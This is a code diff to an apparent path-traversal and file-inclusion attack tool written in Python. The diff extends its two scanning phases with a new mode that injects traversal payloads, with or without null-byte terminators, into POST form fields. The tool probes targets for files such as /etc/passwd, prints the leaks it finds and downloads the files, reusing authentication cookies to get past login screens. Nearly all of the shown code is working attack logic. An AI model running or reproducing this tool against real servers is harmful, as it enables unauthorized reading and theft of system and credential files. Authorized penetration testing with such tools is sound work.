@@ -47,6 +47,7 @@ def query(traverse, dir, file, nb, keyword, url, url2):
     prep.url = url + query
     return (prep, p)
 
+
 """
 [Phase 1]: Vulnerability Analysis
 
@@ -61,8 +62,9 @@ def query(traverse, dir, file, nb, keyword, url, url2):
 @paylist: payload list (all)
 @file: file to be looked up (-i FIL, default: /etc/passwd)
 @authcookie: Authentication Cookie File to bypass Login Screens
+@postdata: POST Data for --attack 4
 """
-def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist, file, authcookie):
+def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist, file, authcookie, postdata):
     #variables for the progress counter
     requestcount = 0
     totalrequests = len(paylist) * (len(nullchars) + 1) * depth
@@ -83,7 +85,10 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
             s.cookies.set_cookie(cookie)
 
     #initial ping for filecheck
-    con2 = s.get(url).content
+    if attack != 4:
+        con2 = s.get(url).content
+    else:
+        con2 = s.post(url, data={}).content
     for i in paylist:
         d = 0
         while d <= depth:
@@ -102,10 +107,20 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
             elif attack == 2:
                 prep, p = inpath(traverse, "", file, "", url, url2)
                 r = s.send(prep)
-            else:
+            elif attack == 3:
                 s.cookies.set(selected, traverse + file)
                 p = traverse + file
                 r = s.get(url)
+            elif attack == 4:
+                p = traverse + file
+                data = {}
+                for prop in postdata.split("&"):
+                    pair = prop.split("=")
+                    if pair[1].strip() == "INJECT":
+                        pair[1] = p
+                    data[pair[0].strip()] = pair[1].strip()
+                assert data != {}
+                r = s.post(url, data=data)
             requestlist.append((r, p, ""))
 
             #repeat for nullbytes
@@ -116,10 +131,20 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
                 elif attack == 2:
                     prep, p = inpath(traverse, "", file, nb, url, url2)
                     r = s.send(prep)
-                else:
+                elif attack == 3:
                     s.cookies.set(selected, traverse + file + nb)
                     p = traverse + file + nb
                     r = s.get(url)
+                elif attack == 4:
+                    p = traverse + file + nb
+                    data = {}
+                    for prop in postdata.split("&"):
+                        pair = prop.split("=")
+                        if pair[1].strip() == "INJECT":
+                            pair[1] = p
+                        data[pair[0].strip()] = pair[1].strip()
+                    assert data != {}
+                    r = s.post(url, data=data)
                 requestlist.append((r, p, nb))
 
             #analyze result
@@ -132,7 +157,7 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
                 else:
                     progress(requestcount, totalrequests, prefix=" ", suffix=" ")
                 if str(r.status_code).startswith("2") or r.status_code == 302 or (r.status_code == 403 and attack != 2):
-                    if filecheck(r, con2, p):
+                    if filecheck(r, con2, p) and attack != 4 or filecheck(r, con2, p, post=True) and attack == 4:
                         payloads.append(i)
                         if nb != "":
                             nullbytes.append(nb)
@@ -165,8 +190,9 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
 @selected_payloads: payloads selected in phase 1
 @selected_nullbytes: terminators selected in phase 1
 @authcookie: Authentication Cookie File to bypass Login Screens
+@postdata: POST Data for --attack 4
 """
-def phase2(attack, url, url2, keyword, cookie, selected, files, dirs, depth, verbose, dl, selected_payloads, selected_nullbytes, authcookie):
+def phase2(attack, url, url2, keyword, cookie, selected, files, dirs, depth, verbose, dl, selected_payloads, selected_nullbytes, authcookie, postdata):
     #variables for the progress counter
     requestcount = 0
     if len(selected_nullbytes) == 0:
@@ -190,7 +216,10 @@ def phase2(attack, url, url2, keyword, cookie, selected, files, dirs, depth, ver
             s.cookies.set_cookie(cookie)
 
     #initial ping for filecheck
-    con2 = s.get(url).content
+    if attack != 4:
+        con2 = s.get(url).content
+    else:
+        con2 = s.post(url, data={}).content
     for dir in dirs:
         for file in files:
             d=1
@@ -206,47 +235,66 @@ def phase2(attack, url, url2, keyword, cookie, selected, files, dirs, depth, ver
                     #send attack requests - with or without nullbyte injection
                     requestlist = []
                     if selected_nullbytes == []:
+                        data = {}
                         if attack == 1:
                             prep, p = query(traverse, dir, file, "", keyword, url, url2)
                             r = s.send(prep)
                         elif attack == 2:
                             prep, p = inpath(traverse, dir, file, "", url, url2)
                             r = s.send(prep)
-                        else:
+                        elif attack == 3:
                             p = traverse + dir + file
                             s.cookies.set(selected, traverse + dir + file)
                             r = s.get(url)
-                        requestlist.append((r,p))
+                        elif attack == 4:
+                            p = traverse + dir + file
+                            for prop in postdata.split("&"):
+                                pair = prop.split("=")
+                                if pair[1].strip() == "INJECT":
+                                    pair[1] = p
+                                data[pair[0].strip()] = pair[1].strip()
+                            assert data != {}
+                            r = s.post(url, data=data)
+                        requestlist.append((r, p, data))
                     else:
                         for nb in selected_nullbytes:
+                            data = {}
                             if attack == 1:
                                 prep, p = query(traverse, dir, file, nb, keyword, url, url2)
                                 r = s.send(prep)
                             elif attack == 2:
                                 prep, p = inpath(traverse, dir, file, nb, url, url2)
                                 r = s.send(prep)
-                            else:
+                            elif attack == 3:
                                 p = traverse + dir + file + nb
                                 s.cookies.set(selected, traverse + dir + file + nb)
                                 r = s.get(url)
-                            requestlist.append((r,p))
+                            elif attack == 4:
+                                p = traverse + dir + file + nb
+                                for prop in postdata.split("&"):
+                                    pair = prop.split("=")
+                                    if pair[1].strip() == "INJECT":
+                                        pair[1] = p
+                                    data[pair[0].strip()] = pair[1].strip()
+                                assert data != {}
+                                r = s.post(url, data=data)
+                            requestlist.append((r, p, data))
 
                     #analyze result
-                    for (r,p) in requestlist:
+                    for (r, p, data) in requestlist:
                         requestcount += 1
                         if sys.platform.lower().startswith('win'):
                             if requestcount % 1000 == 0:
                                 progresswin(requestcount, totalrequests, prefix=" ", suffix=" ")
                         else:
                             progress(requestcount, totalrequests, prefix=" ", suffix=" ")
-                        if attack == 3:
-                            s.cookies.set(selected, p)
+
                         if str(r.status_code).startswith("2") or r.status_code == 302:
-                            if filecheck(r, con2, p):
-                                if attack != 3:
+                            if filecheck(r, con2, p) and attack != 4 or filecheck(r, con2, p, post=True) and attack == 4:
+                                if attack == 1 or attack == 2:
                                     print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"site"+color.END+"="+r.url)
                                     if dl and dir+file not in found:
-                                        download(r.url,dir+file)
+                                        download(r.url,dir+file, cookie=s.cookies)
                                     found.append(dir+file)
                                     if attack == 1:
                                         urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + r.url.split(keyword+"=")[1].replace(url2, ""))
@@ -254,19 +302,30 @@ def phase2(attack, url, url2, keyword, cookie, selected, files, dirs, depth, ver
                                         vlnlist = r.url.split("/")[1::]
                                         vlnpath = ("/".join(i for i in vlnlist)).replace(url2, "")
                                         urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + vlnpath)
-                                else:
+                                elif attack == 3:
+                                    s.cookies.set(selected, p)
                                     print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"cookie"+color.END+"="+p)
                                     if dl and dir+file not in found:
                                         download(r.url,dir+file,cookie=s.cookies)
                                     found.append(dir+file)
                                     urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + p)
+                                elif attack == 4:
+                                    print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"postdata"+color.END+"="+p)
+                                    if dl and dir+file not in found:
+                                        download(r.url,dir+file,cookie=s.cookies,post=data)
+                                    found.append(dir+file)
+                                    urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + p)
                         elif r.status_code == 403 and attack != 2:
-                            if attack != 3:
+                            if attack == 1 or attack == 2:
                                 print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"site"+color.END+"="+r.url)
                                 found.append(dir+file)
                                 urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + r.url.split(keyword+"=")[1].replace(url2, ""))
-                            else:
+                            elif attack == 3:
                                 print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"cookie"+color.END+"="+p)
+                                found.append(dir+file)
+                                urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + p)
+                            elif attack == 4:
+                                print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"postdata"+color.END+"="+p)
                                 found.append(dir+file)
                                 urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + p)
                         else:
